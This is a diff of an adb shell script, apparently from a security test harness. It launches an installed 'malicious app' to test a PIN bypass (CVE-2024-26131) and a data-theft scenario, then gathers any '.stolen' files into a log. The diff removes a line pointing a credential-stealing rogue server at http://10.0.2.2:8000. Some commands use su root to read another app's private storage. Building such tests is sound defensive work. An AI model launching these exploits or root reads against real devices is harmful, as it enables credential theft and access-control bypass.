@@ -102,46 +102,65 @@ echo "MALICIOUS_APP_PACKAGE=${ATTACKER_PKG}" >> "$EVIDENCE_FILE"
 
 echo ""
 echo "✅ Malicious app installed successfully: $ATTACKER_PKG"
-echo "📱 Running PIN bypass exploit..."
 
-# Launch PIN bypass exploit first
+echo "📱 Running PIN bypass exploit (CVE-2024-26131)..."
+# Launch PIN bypass exploit (for access control test)
 debug_log "Launching PIN bypass exploit..."
 adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
     --es exploit_type pin_bypass >/dev/null 2>&1 || true
 
 sleep 3
-
 debug_log "PIN bypass exploit launched"
 
-echo "📱 Running rogue server exploit..."
-
-# Launch rogue server exploit
-debug_log "Launching rogue server credential theft exploit..."
+echo "📱 Running data theft exploit..."
+# Launch data theft exploit (for confidentiality test)
+debug_log "Launching data theft exploit..."
 adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
-    --es exploit_type rogue_server \
-    --es rogue_server_url "http://10.0.2.2:8000" >/dev/null 2>&1 || true
+    --es exploit_type data_theft >/dev/null 2>&1 || true
 
 sleep 3
+debug_log "Data theft exploit launched"
 
-debug_log "Rogue server exploit launched"
+# Create fake_agent_log.log for confidentiality test (similar to Termux)
+LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"
+debug_log "Creating vulnerability test log..."
 
-# Check if exploit created captured homeserver file in app's private storage
-# Similar to Termux fallback: use su root to read from private directory and copy to accessible location
-CAPTURED_FILE_PRIVATE="/data/user/0/$ATTACKER_PKG/files/rogue_server_captured.txt"
-CAPTURED_FILE_ACCESSIBLE="/sdcard/element_rogue_server_captured.txt"
+# CVE-2024-26131 is primarily an access control vulnerability (PIN bypass)
+# NOT a confidentiality vulnerability (data theft)
+# So we don't expect any stolen data - log should be empty
+# If malicious app actually steals data in the future, it would write .stolen files here
 
-debug_log "Checking for captured homeserver file in app's private storage..."
-if adb shell "su root test -f '$CAPTURED_FILE_PRIVATE'" >/dev/null 2>&1; then
-    debug_log "Captured file found in private storage, copying to accessible location..."
-    adb shell "su root cat '$CAPTURED_FILE_PRIVATE'" > /tmp/rogue_server_captured.txt 2>/dev/null || true
+STOLEN_DATA=""
 
-    # Copy to sdcard where test can read it without root
-    adb shell "su root cp '$CAPTURED_FILE_PRIVATE' '$CAPTURED_FILE_ACCESSIBLE'" >/dev/null 2>&1 || true
-    adb shell "su root chmod 644 '$CAPTURED_FILE_ACCESSIBLE'" >/dev/null 2>&1 || true
-
-    debug_log "Captured file copied to $CAPTURED_FILE_ACCESSIBLE"
+# Check if malicious app created any .stolen files (similar to Termux)
+if adb shell ls /sdcard/*.stolen >/dev/null 2>&1; then
+    debug_log "CONFIDENTIALITY BREACH: Stolen files found!"
+    for stolen_file in $(adb shell ls /sdcard/*.stolen 2>/dev/null | tr -d '\r'); do
+        file_content=$(adb shell cat "$stolen_file" 2>/dev/null || echo "ERROR_READING")
+        STOLEN_DATA="$STOLEN_DATA\n=== $stolen_file ===\n$file_content"
+    done
+# Fallback: check app's private directory
+elif adb shell "su 0 sh -c 'ls /data/user/0/$ATTACKER_PKG/files/*.stolen'" >/dev/null 2>&1; then
+    debug_log "CONFIDENTIALITY BREACH: Stolen files found in app private directory!"
+    for stolen_file in $(adb shell "su 0 sh -c 'ls /data/user/0/$ATTACKER_PKG/files/*.stolen'" 2>/dev/null | tr -d '\r'); do
+        file_content=$(adb shell "su 0 sh -c 'cat $stolen_file'" 2>/dev/null || echo "ERROR_READING")
+        STOLEN_DATA="$STOLEN_DATA\n=== $stolen_file ===\n$file_content"
+    done
 else
-    debug_log "No captured file found - exploit may not have succeeded"
+    debug_log "No stolen files found - no confidentiality breach (expected for PIN bypass)"
 fi
 
-debug_log "Test scripts will verify actual security properties"
+# CRITICAL: Only write ACTUAL stolen data to log, not metadata
+# This ensures test only fails if data was actually stolen (exactly like Termux)
+{
+  if [ -n "$STOLEN_DATA" ]; then
+      echo "$STOLEN_DATA"
+  fi
+} > "$LOG_FILE"
+
+echo "Scenario 0 evidence written to: $EVIDENCE_FILE"
+echo "Log written to: $LOG_FILE"
+debug_log "Script completed successfully"
+
+# Clean up temporary files
+adb shell rm -f /sdcard/*.stolen 2>/dev/null || true
